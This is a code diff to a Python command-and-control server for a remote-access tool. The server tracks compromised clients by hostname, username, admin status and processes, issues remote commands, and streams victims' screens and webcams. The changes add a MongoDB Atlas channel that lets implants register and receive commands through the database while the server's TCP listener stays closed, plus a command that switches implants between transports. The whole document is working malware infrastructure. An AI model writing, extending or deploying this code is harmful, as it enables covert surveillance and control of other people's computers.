@@ -108,7 +108,7 @@ class DatabaseManager:
             os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
             self._init_sqlite()
 
-    def switch_mode(self, use_mongo: bool):
+    def switch_mode(self, use_mongo: bool, server: 'AdvancedC2Server' = None):
         if use_mongo:
             if not self.mongodb_uri:
                 self.mongodb_uri = os.environ.get('MONGODB_URI')
@@ -121,9 +121,15 @@ class DatabaseManager:
             self.db = self.client.get_database('c2_database')
             self.use_mongo = True
             self._init_mongo()
+            # Close TCP listener so the OS stops accepting connections at kernel level
+            if server is not None:
+                server._close_tcp_listener()
         else:
             self.use_mongo = False
             self._init_sqlite()
+            # Re-open TCP listener so clients can connect again
+            if server is not None:
+                server._open_tcp_listener()
 
 
     def _init_sqlite(self):
@@ -355,22 +361,53 @@ class AdvancedC2Server:
             self._cv2_available = False
             self.logger.warning(f"cv2/numpy not available — live stream display disabled: {e}")
 
+    def _open_tcp_listener(self):
+        """Create, bind and start listening on the TCP port. Stores socket as self._server_sock."""
+        if getattr(self, '_server_sock', None) is not None:
+            return  # Already open
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind((self.config.host, self.config.port))
+            s.listen(100)
+            s.settimeout(0.01)
+            self._server_sock = s
+            self.logger.success(f"TCP listener opened on {self.config.host}:{self.config.port}")
+        except Exception as e:
+            self.logger.error(f"Failed to open TCP listener: {e}")
+            self._server_sock = None
+
+    def _close_tcp_listener(self):
+        """Close the TCP listening socket so the OS stops accepting connections at kernel level."""
+        s = getattr(self, '_server_sock', None)
+        if s is not None:
+            try:
+                s.close()
+            except Exception:
+                pass
+            self._server_sock = None
+            self.logger.warning("TCP listener closed — no new socket connections will be accepted.")
+
     def start(self):
         self.running = True
+        self._server_sock = None  # managed dynamically
+
         threading.Thread(target=self._command_loop, daemon=True).start()
         threading.Thread(target=self._discovery_responder, daemon=True).start()
         threading.Thread(target=self._audio_playback_loop, daemon=True).start()
         threading.Thread(target=self._poll_mongodb_results, daemon=True).start()
-        
-        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        threading.Thread(target=self._poll_mongodb_handshakes, daemon=True).start()
+
+        # Open TCP listener immediately only if NOT starting in Mongo mode
+        if not self.db.use_mongo:
+            self._open_tcp_listener()
+        else:
+            self.logger.warning(
+                "Starting in MongoDB mode — TCP listener is CLOSED. "
+                "Run 'dbmode normal' to re-open it."
+            )
+
         try:
-            server_sock.bind((self.config.host, self.config.port))
-            server_sock.listen(100)
-            self.logger.success(f"C2 Elite Server listening on {self.config.host}:{self.config.port}")
-            # Very short timeout so the render loop fires at ~200 Hz
-            # This is the fix for stream lag: old 1.0s timeout caused up to 1s render stall
-            server_sock.settimeout(0.01)
             while self.running:
                 # --- Drain ALL pending screen-stream frames (not just one) ---
                 rendered = False
@@ -395,11 +432,8 @@ class AdvancedC2Server:
 
                 # --- One waitKey call per tick covers all OpenCV windows ---
                 if self._cv2_available:
-                    # Process GUI events even if no frames were rendered
-                    # to prevent "Not Responding" state
                     key = self._cv2.waitKey(1) & 0xFF
                     if key == ord('q'):
-                        # Stop whichever stream is active via keyboard
                         if self._stream_active_cid:
                             self._cv2.destroyWindow(f"Live Stream - {self._stream_active_cid[:12]}")
                             self.send_command([self._stream_active_cid], 'stream', {'action': 'stop'})
@@ -410,9 +444,6 @@ class AdvancedC2Server:
                             self.send_command([self._webcam_active_cid], 'webcam_stream', {'action': 'stop'})
                             self._webcam_active_cid = None
                             self._webcam_win_init = False
-                    
-                    # Periodic window check: if the window was closed by user (X button)
-                    # we need to stop the remote stream as well
                     try:
                         if self._stream_active_cid and self._cv2.getWindowProperty(f"Live Stream - {self._stream_active_cid[:12]}", self._cv2.WND_PROP_VISIBLE) < 1:
                             self.send_command([self._stream_active_cid], 'stream', {'action': 'stop'})
@@ -423,26 +454,31 @@ class AdvancedC2Server:
                             self._webcam_active_cid = None
                             self._webcam_win_init = False
                     except:
-                        # Window might not exist or c2 already closed it
                         pass
 
-                # --- Accept new connections (non-blocking) ---
-                try:
-                    client_sock, addr = server_sock.accept()
-                    threading.Thread(target=self._handle_client, args=(client_sock, addr), daemon=True).start()
-                except socket.timeout:
-                    pass
+                # --- Accept new TCP connections only when listener is open ---
+                server_sock = getattr(self, '_server_sock', None)
+                if server_sock is not None:
+                    try:
+                        client_sock, addr = server_sock.accept()
+                        threading.Thread(target=self._handle_client, args=(client_sock, addr), daemon=True).start()
+                    except socket.timeout:
+                        pass
+                    except OSError:
+                        # Socket was closed (e.g. switched to mongo mode)
+                        pass
+                else:
+                    # No listener — small sleep to avoid burning CPU
+                    time.sleep(0.01)
 
-                # --- Poll Database for Commands (Increased frequency) ---
+                # --- Poll Database for Commands ---
                 if not hasattr(self, '_poll_counter'): self._poll_counter = 0
                 self._poll_counter += 1
-                if self._poll_counter >= 5: # Checked every ~50-100ms
+                if self._poll_counter >= 5:
                     self._poll_counter = 0
                     self._poll_database_commands()
 
-                # --- Periodic Sync Active Tasks (Every 5 seconds) ---
-                # The loop sleeps for 0.005s in settimeout, but waitKey(1) also adds delay.
-                # Roughly 100-200 iterations per second. Let's sync every 1000 iterations (~5-10s)
+                # --- Periodic Sync Active Tasks ---
                 if not hasattr(self, '_sync_counter'): self._sync_counter = 0
                 self._sync_counter += 1
                 if self._sync_counter >= 1000:
@@ -451,6 +487,7 @@ class AdvancedC2Server:
         except Exception as e:
             self.logger.error(f"Critical server error: {e}")
         finally:
+            self._close_tcp_listener()
             if self._cv2_available:
                 self._cv2.destroyAllWindows()
 
@@ -750,24 +787,39 @@ class AdvancedC2Server:
             metrics = client_init.get('metrics')
             if metrics:
                 try:
-                    self.db.execute("""
-                        INSERT INTO system_info (
-                            client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total,
-                            network_interfaces, running_processes, network_connections, uptime, timestamp
-                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-                    """, (
-                        cid, 
-                        metrics.get('cpu_usage', 0),
-                        metrics.get('memory_usage', 0),
-                        metrics.get('memory_total', 0),
-                        metrics.get('disk_usage', 0),
-                        metrics.get('disk_total', 0),
-                        json.dumps(metrics.get('network_interfaces', {})),
-                        json.dumps(metrics.get('running_processes', [])),
-                        str(metrics.get('network_connections', 0)),
-                        metrics.get('uptime', 0),
-                        datetime.datetime.now().isoformat()
-                    ))
+                    if self.db.use_mongo:
+                        self.db.db.system_info.insert_one({
+                            "client_id": cid,
+                            "cpu_usage": metrics.get('cpu_usage', 0),
+                            "memory_usage": metrics.get('memory_usage', 0),
+                            "memory_total": metrics.get('memory_total', 0),
+                            "disk_usage": metrics.get('disk_usage', 0),
+                            "disk_total": metrics.get('disk_total', 0),
+                            "network_interfaces": metrics.get('network_interfaces', {}),
+                            "running_processes": metrics.get('running_processes', []),
+                            "network_connections": metrics.get('network_connections', 0),
+                            "uptime": metrics.get('uptime', 0),
+                            "timestamp": datetime.datetime.now().isoformat()
+                        })
+                    else:
+                        self.db.execute("""
+                            INSERT INTO system_info (
+                                client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total,
+                                network_interfaces, running_processes, network_connections, uptime, timestamp
+                            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                        """, (
+                            cid, 
+                            metrics.get('cpu_usage', 0),
+                            metrics.get('memory_usage', 0),
+                            metrics.get('memory_total', 0),
+                            metrics.get('disk_usage', 0),
+                            metrics.get('disk_total', 0),
+                            json.dumps(metrics.get('network_interfaces', {})),
+                            json.dumps(metrics.get('running_processes', [])),
+                            str(metrics.get('network_connections', 0)),
+                            metrics.get('uptime', 0),
+                            datetime.datetime.now().isoformat()
+                        ))
                 except: pass
             
             while self.running and cid in self.clients:
@@ -826,33 +878,53 @@ class AdvancedC2Server:
             return
         if m_type == 'heartbeat': 
             try:
-                self.db.execute("UPDATE clients SET last_seen = ?, status = 'online' WHERE id = ?", 
-                               (datetime.datetime.now().isoformat(), cid))
+                if self.db.use_mongo:
+                    self.db.db.clients.update_one({"id": cid}, {"$set": {"last_seen": datetime.datetime.now().isoformat(), "status": "online"}})
+                else:
+                    self.db.execute("UPDATE clients SET last_seen = ?, status = 'online' WHERE id = ?", 
+                                   (datetime.datetime.now().isoformat(), cid))
                 
                 # Update metrics if provided
                 if 'metrics' in msg:
                     m = msg['metrics']
-                    self.db.execute("""
-                        INSERT INTO system_info (
-                            client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total, 
-                            network_in, network_out,
-                            network_interfaces, running_processes, network_connections, uptime, timestamp
-                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-                    """, (
-                        cid, 
-                        m.get('cpu_usage', 0),
-                        m.get('memory_usage', 0),
-                        m.get('memory_total', 0),
-                        m.get('disk_usage', 0),
-                        m.get('disk_total', 0),
-                        m.get('network_in', 0),
-                        m.get('network_out', 0),
-                        json.dumps(m.get('network_interfaces', {})),
-                        json.dumps(m.get('running_processes', [])),
-                        str(m.get('network_connections', 0)),
-                        m.get('uptime', 0),
-                        datetime.datetime.now().isoformat()
-                    ))
+                    if self.db.use_mongo:
+                        self.db.db.system_info.insert_one({
+                            "client_id": cid,
+                            "cpu_usage": m.get('cpu_usage', 0),
+                            "memory_usage": m.get('memory_usage', 0),
+                            "memory_total": m.get('memory_total', 0),
+                            "disk_usage": m.get('disk_usage', 0),
+                            "disk_total": m.get('disk_total', 0),
+                            "network_in": m.get('network_in', 0),
+                            "network_out": m.get('network_out', 0),
+                            "network_interfaces": m.get('network_interfaces', {}),
+                            "running_processes": m.get('running_processes', []),
+                            "network_connections": m.get('network_connections', 0),
+                            "uptime": m.get('uptime', 0),
+                            "timestamp": datetime.datetime.now().isoformat()
+                        })
+                    else:
+                        self.db.execute("""
+                            INSERT INTO system_info (
+                                client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total, 
+                                network_in, network_out,
+                                network_interfaces, running_processes, network_connections, uptime, timestamp
+                            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                        """, (
+                            cid, 
+                            m.get('cpu_usage', 0),
+                            m.get('memory_usage', 0),
+                            m.get('memory_total', 0),
+                            m.get('disk_usage', 0),
+                            m.get('disk_total', 0),
+                            m.get('network_in', 0),
+                            m.get('network_out', 0),
+                            json.dumps(m.get('network_interfaces', {})),
+                            json.dumps(m.get('running_processes', [])),
+                            str(m.get('network_connections', 0)),
+                            m.get('uptime', 0),
+                            datetime.datetime.now().isoformat()
+                        ))
             except Exception as e:
                 self.logger.error(f"Error updating heartbeat/metrics for {cid}: {e}")
             return
@@ -869,13 +941,22 @@ class AdvancedC2Server:
             active_ids = msg.get('active_ids', [])
             # Mark all commands for this client as is_active=0 if NOT in this list
             # and they were previously is_active=1
-            query = "UPDATE commands SET is_active = 0 WHERE client_id = ? AND is_active = 1"
-            params = [cid]
-            if active_ids:
-                placeholders = ','.join(['?'] * len(active_ids))
-                query += f" AND id NOT IN ({placeholders})"
-                params.extend(active_ids)
-            self.db.execute(query, params)
+            if self.db.use_mongo:
+                try:
+                    mongo_query = {"client_id": cid, "is_active": 1}
+                    if active_ids:
+                        mongo_query["id"] = {"$nin": active_ids}
+                    self.db.db.commands.update_many(mongo_query, {"$set": {"is_active": 0}})
+                except Exception as e:
+                    self.logger.error(f"Failed to sync tasks in Mongo: {e}")
+            else:
+                query = "UPDATE commands SET is_active = 0 WHERE client_id = ? AND is_active = 1"
+                params = [cid]
+                if active_ids:
+                    placeholders = ','.join(['?'] * len(active_ids))
+                    query += f" AND id NOT IN ({placeholders})"
+                    params.extend(active_ids)
+                self.db.execute(query, params)
             return
         if m_type == 'status_update':
             rid = msg.get('command_id') or msg.get('id')
@@ -1043,22 +1124,40 @@ class AdvancedC2Server:
     def _update_db(self, cid, ip, info):
         # Harmonize keys: node -> hostname, platform -> os, username -> user
         h = info.get('hostname') or info.get('node') or '?'
-        o = info.get('platform') or info.get('system') or '?'
+        o = info.get('platform') or info.get('os') or '?'
         u = info.get('username') or info.get('user') or '?'
         
-        self.db.execute('''
-            INSERT INTO clients (id, ip_address, hostname, os, username, last_seen, status, gpu, motherboard) 
-            VALUES (?,?,?,?,?,?,?,?,?)
-            ON CONFLICT(id) DO UPDATE SET 
-                ip_address=excluded.ip_address,
-                hostname=excluded.hostname,
-                os=excluded.os,
-                username=excluded.username,
-                last_seen=excluded.last_seen,
-                status='online',
-                gpu=excluded.gpu,
-                motherboard=excluded.motherboard
-        ''', (cid, ip, h, o, u, datetime.datetime.now().isoformat(), 'online', info.get('gpu'), info.get('motherboard')))
+        if self.db.use_mongo:
+            try:
+                client_data = {
+                    "id": cid,
+                    "ip_address": ip,
+                    "hostname": h,
+                    "os": o,
+                    "username": u,
+                    "gpu": info.get('gpu', ''),
+                    "motherboard": info.get('motherboard', ''),
+                    "status": "online",
+                    "last_seen": datetime.datetime.now().isoformat(),
+                    "is_admin": info.get('is_admin', 0)
+                }
+                self.db.db.clients.update_one({"id": cid}, {"$set": client_data}, upsert=True)
+            except Exception as e:
+                self.logger.error(f"Failed to update client in Mongo: {e}")
+        else:
+            self.db.execute('''
+                INSERT INTO clients (id, ip_address, hostname, os, username, last_seen, status, gpu, motherboard) 
+                VALUES (?,?,?,?,?,?,?,?,?)
+                ON CONFLICT(id) DO UPDATE SET 
+                    ip_address=excluded.ip_address,
+                    hostname=excluded.hostname,
+                    os=excluded.os,
+                    username=excluded.username,
+                    last_seen=excluded.last_seen,
+                    status='online',
+                    gpu=excluded.gpu,
+                    motherboard=excluded.motherboard
+            ''', (cid, ip, h, o, u, datetime.datetime.now().isoformat(), 'online', info.get('gpu'), info.get('motherboard')))
 
     def _remove_client(self, cid):
         with self.client_lock:
@@ -1067,18 +1166,24 @@ class AdvancedC2Server:
                 if self.selected_client == cid: self.selected_client = None
                 self.logger.warning(f"Session Terminated: {cid}")
         try:
-            self.db.execute("UPDATE clients SET status = 'offline', last_seen = ? WHERE id = ?", 
-                           (datetime.datetime.now().isoformat(), cid))
-            # Mark all tasks as inactive for this client
-            self.db.execute("UPDATE commands SET is_active = 0 WHERE client_id = ? AND is_active = 1", (cid,))
+            if self.db.use_mongo:
+                self.db.db.clients.update_one({"id": cid}, {"$set": {"status": "offline", "last_seen": datetime.datetime.now().isoformat()}})
+                self.db.db.commands.update_many({"client_id": cid, "is_active": 1}, {"$set": {"is_active": 0}})
+            else:
+                self.db.execute("UPDATE clients SET status = 'offline', last_seen = ? WHERE id = ?", 
+                               (datetime.datetime.now().isoformat(), cid))
+                # Mark all tasks as inactive for this client
+                self.db.execute("UPDATE commands SET is_active = 0 WHERE client_id = ? AND is_active = 1", (cid,))
         except: pass
 
     def _sync_all_active_tasks(self):
-        """Send sync_tasks request to all connected clients"""
+        """Send sync_tasks request to TCP-connected clients only (mongo-transport handles its own sync)"""
         with self.client_lock:
             if not self.clients: return
-            cids = list(self.clients.keys())
-        self.send_command(cids, 'sync_tasks')
+            # Only TCP clients: mongo-transport clients don't support sync_tasks
+            cids = [cid for cid, c in self.clients.items() if not c.get('mongo_transport')]
+        if cids:
+            self.send_command(cids, 'sync_tasks')
 
     def send_command(self, targets, c_type, params=None, cmd_id=None):
         ts = datetime.datetime.now().isoformat()
@@ -1088,22 +1193,30 @@ class AdvancedC2Server:
             # Register the command in the database (either MongoDB or SQLite)
             if self.db.use_mongo:
                 try:
-                    self.db.db.commands.insert_one({
-                        "id": per_target_id,
-                        "client_id": cid,
-                        "command_type": "command",
-                        "command_name": c_type,
-                        "parameters": json.dumps(params or {}),
-                        "status": "pending",
-                        "result": None,
-                        "error_message": None,
-                        "execution_time": None,
-                        "created_at": ts,
-                        "updated_at": ts,
-                        "is_active": 0
-                    })
+                    self.db.db.commands.update_one(
+                        {"id": per_target_id},
+                        {
+                            "$setOnInsert": {
+                                "id": per_target_id,
+                                "client_id": cid,
+                                "command_type": "command",
+                                "command_name": c_type,
+                                "parameters": json.dumps(params or {}),
+                                "created_at": ts,
+                            },
+                            "$set": {
+                                "status": "pending",
+                                "result": None,
+                                "error_message": None,
+                                "execution_time": None,
+                                "updated_at": ts,
+                                "is_active": 0
+                            }
+                        },
+                        upsert=True
+                    )
                 except Exception as e:
-                    self.logger.error(f"Failed to insert command into Mongo: {e}")
+                    self.logger.error(f"Failed to upsert command into Mongo: {e}")
             else:
                 try:
                     with self.db._sqlite_lock:
@@ -1117,6 +1230,10 @@ class AdvancedC2Server:
             client = self.clients.get(cid)
             if not client:
                 continue
+            if client.get('mongo_transport'):
+                # DB-only transport: command is already in MongoDB (with status "pending").
+                # No socket send is needed.
+                continue
             try:
                 payload = {'id': per_target_id, 'type': c_type, 'params': params or {}}
                 self._send_raw(client['sock'], self.crypto.encrypt_json(payload))
@@ -1127,6 +1244,8 @@ class AdvancedC2Server:
 
     def _poll_mongodb_results(self):
         """Poll MongoDB for completed/failed command results to display to the console operator"""
+        # Internal server commands whose results should never be shown on the panel
+        _SILENT_CMDS = {'sync_tasks', 'dbmode_client'}
         while self.running:
             try:
                 if self.db.use_mongo and hasattr(self.db, 'db'):
@@ -1134,24 +1253,32 @@ class AdvancedC2Server:
                         "status": {"$in": ["completed", "failed"]},
                         "id": {"$nin": list(self._printed_command_ids)}
                     }))
-                    
+
                     for cmd in completed_cmds:
                         cmd_id = cmd.get('id')
                         cid = cmd.get('client_id')
                         status = cmd.get('status')
+                        cmd_name = cmd.get('command_name', '')
                         result_data = cmd.get('result')
-                        error_msg = cmd.get('error_message')
-                        
+                        error_msg = cmd.get('error_message', '')
+
                         self._printed_command_ids.add(cmd_id)
                         if len(self._printed_command_ids) > 10000:
                             self._printed_command_ids.clear()
-                            
+
+                        # Skip internal housekeeping commands silently
+                        if cmd_name in _SILENT_CMDS:
+                            continue
+                        # Skip 'Unsupported command type' noise for silent cmds
+                        if error_msg and any(s in error_msg for s in _SILENT_CMDS):
+                            continue
+
                         if result_data:
                             try: data = json.loads(result_data)
                             except: data = result_data
                         else:
                             data = error_msg or "No result or error message returned."
-                            
+
                         print(f"{Fore.CYAN}\n[MONGO-RESULT][{cid}] [{cmd_id}]")
                         if isinstance(data, dict):
                             if 'stdout' in data or 'stderr' in data:
@@ -1166,6 +1293,58 @@ class AdvancedC2Server:
             except Exception as e:
                 pass
             time.sleep(2)
+
+    def _poll_mongodb_handshakes(self):
+        """Poll MongoDB for new clients waiting for connection via DB-only transport"""
+        while self.running:
+            try:
+                if self.db.use_mongo and hasattr(self.db, 'db'):
+                    # Find clients that are waiting OR were already connected in a previous
+                    # server session (status=server_connected but not in self.clients).
+                    # The second case covers a server restart scenario.
+                    waiting_clients = list(self.db.db.mongo_handshake.find({
+                        "status": {"$in": ["client_waiting", "server_connected"]}
+                    }))
+                    for ws in waiting_clients:
+                        cid = ws.get('client_id')
+                        info = ws.get('info', {})
+
+                        with self.client_lock:
+                            already_registered = cid in self.clients
+
+                        if already_registered:
+                            # Nothing to do — just make sure the handshake status is server_connected
+                            if ws.get('status') != 'server_connected':
+                                self.db.db.mongo_handshake.update_one(
+                                    {"client_id": cid},
+                                    {"$set": {
+                                        "status": "server_connected",
+                                        "timestamp": datetime.datetime.now().isoformat()
+                                    }}
+                                )
+                            continue
+
+                        # New or re-connecting client — acknowledge and register
+                        self.db.db.mongo_handshake.update_one(
+                            {"client_id": cid},
+                            {"$set": {
+                                "status": "server_connected",
+                                "timestamp": datetime.datetime.now().isoformat()
+                            }}
+                        )
+                        with self.client_lock:
+                            self.clients[cid] = {
+                                'sock': None,
+                                'addr': ('0.0.0.0', 0),
+                                'info': info,
+                                'mongo_transport': True
+                            }
+                        self.logger.success(f"Session Established (MongoDB DB-only): {cid}")
+                        self._update_db(cid, '0.0.0.0', info)
+            except Exception as e:
+                pass
+            time.sleep(2)
+
 
     def _command_loop(self):
         while self.running:
@@ -1220,13 +1399,13 @@ class CommandParser:
                     mode = args[0].lower()
                     if mode in ('mongo', 'mongodb'):
                         try:
-                            self.server.db.switch_mode(True)
+                            self.server.db.switch_mode(True, server=self.server)
                             self.server.logger.success("Switched database mode to MongoDB Atlas")
                         except Exception as e:
                             self.server.logger.error(f"Failed to switch to MongoDB: {e}")
                     elif mode in ('sqlite', 'normal', 'sqlite3'):
                         try:
-                            self.server.db.switch_mode(False)
+                            self.server.db.switch_mode(False, server=self.server)
                             self.server.logger.success("Switched database mode to SQLite (Normal)")
                         except Exception as e:
                             self.server.logger.error(f"Failed to switch to SQLite: {e}")
@@ -1235,6 +1414,13 @@ class CommandParser:
                 else:
                     current_mode = "MongoDB" if self.server.db.use_mongo else "SQLite (Normal)"
                     print(f"Current database mode: {current_mode}")
+            elif cmd == 'dbmode_client':
+                if args:
+                    mode = args[0].lower()
+                    self.server.send_command(targets, 'dbmode_client', {'mode': mode})
+                    self.server.logger.success(f"Sent command to switch client mode to {mode}")
+                else:
+                    print("Usage: dbmode_client <normal|mongo>")
             elif cmd == 'exit': os._exit(0)
             
             # --- Remote Execution ---
